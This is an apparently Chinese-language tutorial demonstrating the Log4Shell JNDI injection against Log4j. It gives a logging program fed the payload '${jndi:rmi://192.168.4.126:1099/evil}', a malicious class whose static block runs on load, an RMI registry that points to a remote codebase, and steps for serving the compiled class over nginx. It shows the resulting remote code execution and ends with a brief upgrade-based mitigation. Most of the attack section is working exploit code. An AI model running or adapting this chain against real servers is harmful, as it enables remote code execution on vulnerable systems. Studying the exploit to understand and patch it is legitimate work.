<a name="Ay9qE"></a>
### 服务端日志生成
public static final Logger _LOGGER _= LogManager._getLogger_(log4jTest.class);<br />public static void main(String[] args) {

    //this is a login interface,<br />	//输出操作系统版本<br />    String userName = "${java:os}";<br />    _LOGGER_.error("show the system version: {}", userName);<br />	//hacker do something<br />    String password = "${jndi:rmi://192.168.4.126:1099/evil}";<br />    _LOGGER_.error("my password: {}", password);

} 


<a name="Qx4vB"></a>
### 黑客端
//hacker do something<br />public class EvilObj {<br />    static {<br />        System.out.println("I am a hacker, i am do something now");<br />    }<br />}

//registry hacker <br />public class RMIServer {<br />    public static void main(String[] args) {<br />        try{<br />            LocateRegistry.createRegistry(1099);<br />            Registry registry = LocateRegistry.getRegistry();

            System.out.println("hacker create registry on port 1099");

            Reference reference =new Reference("EvilObj", "EvilObj", "http://127.0.0.1:80/");<br />            ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);<br />            registry.bind("evil", referenceWrapper);<br />        }<br />        catch (Exception e){<br />            e.printStackTrace();<br />        }<br />    }<br />}


<a name="TQP6x"></a>
### 部署
启动nginx，将编译后EvilObj.class放入html文件夹（即默认配置的80端口目录，对应注册的80端口）


<a name="fXXvG"></a>
### 结果
在服务端执行了EvilObj的代码System.out.println("I am a hacker, i am do something now");

<a name="z1ORF"></a>
### 预防
升级最新log4j版本或者更换高等级jdk版本（jdk8u121）
